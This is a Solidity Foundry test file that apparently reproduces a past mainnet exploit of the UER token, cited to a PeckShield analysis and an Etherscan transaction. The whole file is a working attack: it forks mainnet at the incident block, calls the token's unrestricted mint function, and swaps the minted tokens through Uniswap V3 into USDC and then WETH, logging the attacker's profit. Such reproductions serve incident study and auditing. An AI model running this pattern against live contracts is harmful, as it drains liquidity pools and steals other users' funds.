// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// Analysis
// https://twitter.com/peckshield/status/1581988895142526976
// TX
// https://etherscan.io/tx/0xf4a3d0e01bbca6c114954d4a49503fc94dfdbc864bded5530b51a207640d86b5

interface UER20 is IERC20 {
    function mint() external;
}

contract ContractTest is DSTest {
    UER20 UER = UER20(0x418C24191aE947A78C99fDc0e45a1f96Afb254BE);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15_767_837);
    }

    function testExploit() public {
        uint256 ETHBalanceBefore = address(this).balance;
        UER.mint();
        UER.approve(address(Router), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);
        UERToUSDC();
        USDCToWETH();
        uint256 WETHProfit = WETH.balanceOf(address(this));

        emit log_named_decimal_uint("[End] Attacker WETH balance after exploit", WETHProfit, 18);
    }

    function UERToUSDC() internal {
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(UER),
            tokenOut: address(USDC),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: UER.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Params);
    }

    function USDCToWETH() internal {
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDC),
            tokenOut: address(WETH),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: USDC.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Params);
    }
}
